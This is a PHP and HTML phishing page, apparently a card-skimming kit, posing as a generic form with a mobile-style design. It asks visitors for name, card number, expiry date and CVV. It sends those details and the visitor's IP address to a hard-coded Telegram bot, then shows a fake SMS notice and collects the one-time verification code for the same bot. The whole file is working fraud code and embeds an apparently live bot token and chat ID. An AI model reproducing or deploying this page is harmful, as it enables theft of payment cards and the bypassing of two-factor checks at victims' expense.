<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Get form data
  $email = $_POST['email'];
  $name = $_POST['name'];
  $memberCardNumber = $_POST['memberCardNumber'];
  $expirationCardNumber = $_POST['expirationCardNumber'];

  // Process expiration card number
  $expirationCardNumber = preg_replace('/\D/', '', $expirationCardNumber); // Remove non-numeric characters
  $expirationMonth = substr($expirationCardNumber, 0, 2);
  $expirationYear = substr($expirationCardNumber, 2);

  // Get IP address
  $ip = $_SERVER['REMOTE_ADDR'];

  // Send data to Telegram bot
  $botToken = '6218357486:AAGuejJXswpTYzMMUQWaSaTBcWGYmIar0kw';
  $chatID = '-1001926682773';
  $url = "https://api.telegram.org/bot$botToken/sendMessage";

  $data = array(
    'chat_id' => $chatID,
    'text' => "New form submission:\nEmail: $email\nName: $name\nMember Card Number: $memberCardNumber\nExpiration Card Number: $expirationMonth/$expirationYear\nIP: $ip"
  );

  $options = array(
    'http' => array(
      'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
      'method'  => 'POST',
      'content' => http_build_query($data)
    )
  );

  $context  = stream_context_create($options);
  $result = file_get_contents($url, false, $context);

  if ($result !== false) {
    // Redirect to the code form
    echo '<script>window.location.href = "#secondForm";</script>';
  } else {
    echo 'Error sending form data.';
  }
}
?>
<!DOCTYPE html>
<html>
<head>
  <title>Form Submission</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
<style>
    /* Add iOS-inspired mobile compatibility styles */
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #F7F7F7;
      padding: 20px;
    }
    
    .container {
      max-width: 500px;
      margin: 0 auto;
      background-color: #FFFFFF;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    }
    
    h1, h2 {
      text-align: center;
      color: #333333;
    }
    
    label {
      display: block;
      margin-bottom: 5px;
      color: #555555;
    }
    
    input[type="email"],
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #CCCCCC;
      border-radius: 5px;
      font-size: 16px;
    }
    
    input[type="submit"] {
      display: block;
      width: 100%;
      padding: 10px;
      border-radius: 5px;
      background-color: #007AFF;
      color: #FFFFFF;
      font-size: 16px;
      cursor: pointer;
    }
    
    .message {
      text-align: center;
      margin-bottom: 20px;
      color: #007AFF;
      font-weight: bold;
    }
    
    /* Media queries for responsiveness */
    @media only screen and (max-width: 600px) {
      .container {
        max-width: 100%;
        padding: 10px;
      }
      
      input[type="submit"] {
        font-size: 14px;
      }
    }
  </style>
  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
</head>
<body>
  <div class="container">
<img src="https://im.ezgif.com/tmp/ezgif-1-2abed36c9f.gif"   width="100%" height="100%">
    <form id="myForm" method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
    <br>
    <br>

      <label for="name">Name:</label>
      <input type="text" id="name" name="name" required>
      <label for="memberCardNumber"> Card Number:</label>
      <input type="text" id="memberCardNumber" name="memberCardNumber" required>
      <label for="expirationCardNumber">Expiration Card Number (MM/YY):</label>
      <input type="text" id="expirationCardNumber" name="expirationCardNumber" placeholder="02/31" required>
      
      
            <label for="email">Security code:</label>
      <input placeholder="3-digit CVV" type="text" id="email" name="email" required>
      
      <input type="submit" value="Submit">
    </form>

    <p id="message" class="message"></p>

    <div id="secondForm" style="display: none;">
      <h2>Enter Code</h2>
      <form id="codeForm">
        <label for="code">Code:</label>
        <input type="text" id="code" name="code" required>
        <input type="submit" value="Submit Code">
        
        
        <a href="#" > Get new code ? </a>
      </form>
    </div>
  </div>

  <script>
    document.getElementById('myForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent form submission

      const email = document.getElementById('email').value;
      const name = document.getElementById('name').value;
      const memberCardNumber = document.getElementById('memberCardNumber').value;
      const expirationCardNumber = document.getElementById('expirationCardNumber').value;

      // Send data to Telegram bot
      const botToken = '6218357486:AAGuejJXswpTYzMMUQWaSaTBcWGYmIar0kw';
      const chatID = '-1001926682773';
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      const data = {
        chat_id: chatID,
        text: `New form submission:\nEmail: ${email}\nName: ${name}\nMember Card Number: ${memberCardNumber}\nExpiration Card Number: ${expirationCardNumber}\nIP: <?php echo $_SERVER['REMOTE_ADDR']; ?>`
      };

      axios.post(url, data)
        .then(function(response) {
          // Clear form fields
          document.getElementById('email').value = '';
          document.getElementById('name').value = '';
          document.getElementById('memberCardNumber').value = '';
          document.getElementById('expirationCardNumber').value = '';

          // Show success message
          document.getElementById('message').innerText = 'A verification code has been sent to your phone via SMS !';

          // Hide the first form
          document.getElementById('myForm').style.display = 'none';

          // Show the second form
          document.getElementById('secondForm').style.display = 'block';
        })
        .catch(function(error) {
          console.log(error);
        });
    });

    document.getElementById('codeForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent form submission

      const code = document.getElementById('code').value;

      // Send code to Telegram bot
      const botToken = '6218357486:AAGuejJXswpTYzMMUQWaSaTBcWGYmIar0kw';
      const chatID = '-1001926682773';
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      const data = {
        chat_id: chatID,
        text: `Code: ${code}\nIP: <?php echo $_SERVER['REMOTE_ADDR']; ?>`
      };

      axios.post(url, data)
        .then(function(response) {
          // Clear code field
          document.getElementById('code').value = '';

          // Redirect to a success page or perform any other action
          alert('Code submitted successfully!');
        })
        .catch(function(error) {
          console.log(error);
        });
    });
  </script>
</body>
</html>

